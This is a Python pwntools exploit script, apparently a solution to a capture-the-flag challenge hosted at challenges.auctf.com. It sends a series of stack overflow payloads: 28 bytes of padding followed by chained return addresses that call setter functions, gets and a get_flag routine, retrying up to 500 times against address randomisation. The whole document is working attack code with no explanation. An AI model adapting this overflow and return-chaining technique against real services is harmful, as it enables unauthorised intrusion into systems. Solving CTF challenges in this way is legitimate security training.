from pwn import *
from time import sleep

base=0x56592000
libc_got_offset=base+0x00004028
puts_plt=base+0x00001040
gets_plt=base+0x00001050

room4_plt=base+0x00001580
set1=base+0x000016de
set2=base+0x0000176e
set3=base+0x000017cd
set4=base+0x000017e9
var=base+16470
pop_ebp=base+0x000017e7
get_flag=base+0x0000186b
context.log_level="error"
for i in range(500):
	print i
	p=remote("challenges.auctf.com",30012)
	p.send("2")
	p.send("4")
	p.send("3")
	p.sendline("Stephen")
	p.recvuntil("Enter something:")
	payload=""
	payload+="A"*28
	payload+=p32(set1)
	payload+=p32(room4_plt)
	payload+=p32(0xfeedc0de)
	p.sendline(payload)
	try:
		p.recvuntil("Enter something:")
		payload=""
		payload+="A"*28
		payload+=p32(set3)
		payload+=p32(room4_plt)
		p.sendline(payload)
		p.recvuntil("Enter something:")
		payload=""
		payload+="A"*28
		payload+=p32(set2)
		payload+=p32(room4_plt)
		p.sendline(payload)
		p.recvuntil("Enter something:")
		payload=""
		payload+=p32(0x56596000)*7
		payload+=p32(gets_plt)
		payload+=p32(pop_ebp)
		payload+=p32(var)
		payload+=p32(room4_plt)
		p.sendline(payload)
		sleep(0.2)
		p.sendline("ab")
		payload=""
		payload+="A"*28
		payload+=p32(set4)
		payload+=p32(room4_plt)
		p.sendline(payload)

		payload=""
		payload+="A"*28
		payload+=p32(get_flag)
		p.sendline(payload)
		p.interactive()
		break
	except:
		c=0	
	p.close()



#0x56593050
















